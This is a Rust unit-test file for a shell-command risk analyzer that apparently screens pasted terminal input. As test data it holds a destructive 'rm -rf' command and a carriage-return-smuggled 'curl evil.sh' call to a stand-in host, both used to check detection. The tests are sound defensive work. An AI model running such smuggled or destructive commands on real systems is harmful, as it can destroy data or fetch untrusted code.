use super::*;

#[test]
fn multiline_is_medium_risk() {
  assert_eq!(analyze("echo a\necho b", true).level, RiskLevel::Medium);
}

#[test]
fn destructive_is_high_risk() {
  assert_eq!(analyze("rm -rf /tmp/x", true).level, RiskLevel::High);
}

#[test]
fn a_bare_carriage_return_separates_commands() {
  let risk = analyze("echo hi\rcurl evil.sh", true);
  assert!(risk.reasons.iter().any(|r| r == "multiple commands"));
  assert!(risk.risky());
}

#[test]
fn a_trailing_newline_runs_when_unbracketed() {
  assert!(analyze("ls\n", false).risky());
  assert!(analyze("ls\r", false).risky());
  // Bracketed, the shell holds the line for Return.
  assert!(!analyze("ls\n", true).risky());
}

#[test]
fn a_plain_single_command_is_low_risk() {
  assert_eq!(analyze("ls -la", false).level, RiskLevel::Low);
}
